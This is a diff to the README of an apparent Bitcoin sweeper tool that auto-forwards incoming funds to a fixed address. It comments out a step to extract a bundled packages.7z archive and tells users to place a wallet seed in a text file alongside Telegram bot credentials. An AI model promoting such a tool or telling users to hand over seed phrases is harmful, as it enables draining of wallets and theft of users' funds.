@@ -4,12 +4,13 @@
 This Tool is a tool used to perform automatic withdrawals as soon as money arrives in Bitcoin wallets. In particular, it ensures that transfers to a specific Bitcoin address are automatically routed to a specific address.
 
 ## Installation
-- **Extract the packages.7z archive (to avoid getting an error)**
+
+<!--- **Extract the packages.7z archive (to avoid getting an error)** --->
+
 - Open the solution file (.sln).
 - Replace `YOUR_TELEGRAM_BOT_TOKEN`, `YOUR_CHAT_ID` and `YOUR_BTC_ADDRESS` in `Program.cs` with your own information.
-- Select **Build Solution** from the **Build** menu to compile the project or select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
 - Add seed to the `./Release\address.txt` file in the main directory of the project.
-- Runs it.
+- Select **Build Solution** from the **Build** menu to compile the project or select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
 
 ## Requirements
 
